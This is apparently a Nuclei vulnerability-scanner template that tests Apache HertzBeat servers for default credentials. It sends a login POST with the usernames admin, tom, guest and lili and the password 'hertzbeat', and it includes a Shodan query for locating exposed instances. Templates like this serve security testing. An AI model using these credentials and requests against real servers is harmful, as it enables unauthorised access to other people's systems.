http:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"token":'
    - '{"data":{'
    - 'role":'
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    username:
    - admin
    - tom
    - guest
    - lili
  raw:
  - 'POST /api/account/auth/form HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"type":0,"identifier":"{{username}}","credential":"{{password}}"}

    '
id: apache-hertzbeat-default-login
info:
  author: securitytaters,icarot
  description: 'Apache HertzBeat enables default admin (and others) credentials. An
    attacker can execute unauthorized operations.

    '
  metadata:
    max-request: 4
    shodan-query: title:"HertzBeat"
    verified: true
  name: Apache HertzBeat - Default Credentials
  reference:
  - https://github.com/apache/hertzbeat
  severity: high
  tags: apache,hertzbeat,default-login,vuln
variables:
  password: hertzbeat
